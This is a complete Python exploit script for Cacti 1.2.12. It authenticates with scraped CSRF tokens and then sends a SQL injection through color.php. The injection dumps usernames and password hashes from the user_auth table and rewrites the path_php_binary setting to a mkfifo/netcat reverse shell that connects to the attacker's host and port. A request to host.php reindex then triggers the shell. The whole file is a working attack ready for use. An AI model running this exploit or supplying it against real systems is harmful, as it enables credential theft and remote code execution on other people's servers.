import argparse
import requests
import re
import time

def string_fix(url):
    if url[-1] == "/": 
        fixed_url = url.rstrip(url[-1])
        return fixed_url
    else:
        return url

def nccheck(url,username,password,lhost,lport):
    while True:
        nc_check = input("Is netcat running? y or n? ")
        if nc_check == 'y':
            sql_exploit(url,username,password,lhost,lport)
        elif nc_check == 'n':
            print("Make sure netcat is running with nc -lvnp " + lport)
            exit()
        else:
            continue

def sql_exploit(url,username,password,lhost,lport):
    login_url = url + '/cacti/index.php'

    print("Getting the csrf token!")
    time.sleep(1)

    session = requests.Session()
    csrf_url_req = session.get(login_url)
    
    csrf = re.findall("srfMagicToken = \"(.*);ip",csrf_url_req.text)
    
    print("The csrf is token is: " + csrf[0])
    time.sleep(1)

    data = {'__csrf_magic':csrf[0],'action':'login','login_username':username,'login_password':password}

    print("Logging in")
    time.sleep(1)
    login_req = session.post(login_url,data=data)

    print("Sending payload")
    time.sleep(1)
    sql_inj_url = url + "/cacti/color.php?action=export&header=false&filter=1%27)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value=%27rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+"+lhost+"+"+lport+"+%3E/tmp/f;%27+where+name=%27path_php_binary%27;--+-"
    sql_inj_req = session.get(sql_inj_url)

    payload_execute_url = url + "/cacti/host.php?action=reindex"
    payload_execute_req = session.get(payload_execute_url)



def main():
    parser = argparse.ArgumentParser(description='Cacti 1.2.12 - SQL Injection / Authenticated Remote Code Execution')

    parser.add_argument('-t', metavar='<Target URL>', help='target/host URL, E.G: http://exploitcacti.com', required=True)
    parser.add_argument('-u', metavar='<user>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
    parser.add_argument('-lhost', metavar='<lhost>', help='Your IP Address', required=True)
    parser.add_argument('-lport', metavar='<lport>', help='Your Listening Port', required=True)
    args = parser.parse_args()

    url = args.t
    username = args.u
    password = args.p
    lhost = args.lhost
    lport = args.lport

    url = string_fix(url)

    while True:
        try:
            nccheck(url,username,password,lhost,lport)
        except KeyboardInterrupt:
            print("Bye Bye!")
            exit()

if __name__ == "__main__":
    main()